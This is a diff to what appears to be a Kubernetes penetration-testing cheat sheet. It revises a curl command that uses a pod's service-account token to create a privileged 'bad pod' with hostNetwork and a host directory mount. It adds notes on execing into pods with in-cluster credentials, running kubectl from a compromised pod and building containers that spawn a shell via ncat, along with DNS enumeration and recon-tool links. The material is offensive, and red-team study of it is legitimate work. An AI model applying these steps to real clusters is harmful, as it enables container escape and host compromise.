@@ -206,13 +206,12 @@ curl  --cacert ${CACERT} -s $APISERVER/api/v1/namespaces/kube-system/pods/kube-a
 #### create a bad pod using rest API
 
 ```shell
-curl -X POST -H 'Content-Type: application/yaml' \
+curl --cacert ${CACERT} --header "Authorization: Bearer $TOKEN" -X POST -H 'Content-Type: application/yaml' \
 --data '
 apiVersion: v1
 kind: Pod
 metadata:
-  name: debug
-  namespace: default
+  name: debug3
 spec:
   containers:
     - command:
@@ -239,12 +238,27 @@ spec:
         type: Directory
       name: host
   hostNetwork: true
-' "http://localhost:8001/api/v1/namespaces/default/pods"
+' "https://${KUBERNETES_SERVICE_HOST}/api/v1/namespaces/${NAMESPACE}/pods"
 ```
 
 #### k8s api exec using python
 
 To create a pod and [exec](https://github.com/kubernetes-client/python/blob/master/examples/pod_exec.py)
+I have done a minor update to the script so it instead uses credentials from running inside a pod [kubernetes/pod_exec.py](kubernetes/pod_exec.py)
+
+At the same time it's not worth having all the access that you need to exec. It would be a extremely strange rbac rule to write for a normal service account, so this isn't very realistic.
+Instead you should focus on writing a good container file that automatically gives you a shell using something like ncat.
+
+But it's a good option if you don't got curl or wget but you have python and you want a simple script to create a pod.
+At the same time you would have to install pip or rewrite the script to use pure rest api instead.
+
+If you want to install pip you can easily do so through `python -m ensurepip --upgrade`
+
+### kubectl within a pod
+
+Just download kubectl and thanks to the environment vars you don't have to do anything.
+Having issues to create an active session towards the host. But not a problem to perform single commands.
+Need to do some redirect magic to stdout and it should work.
 
 ### dns
 
@@ -254,9 +268,9 @@ Outputs all dns endpoints in a cluster.
 dig +noall +answer srv any.any.svc.cluster.local
 ```
 
-### deepce access checker
+### kubernetes tools
 
-[https://github.com/stealthcopter/deepce](https://github.com/stealthcopter/deepce)
+[check capabilities etc](https://github.com/genuinetools/amicontained)
 
 ## install
 
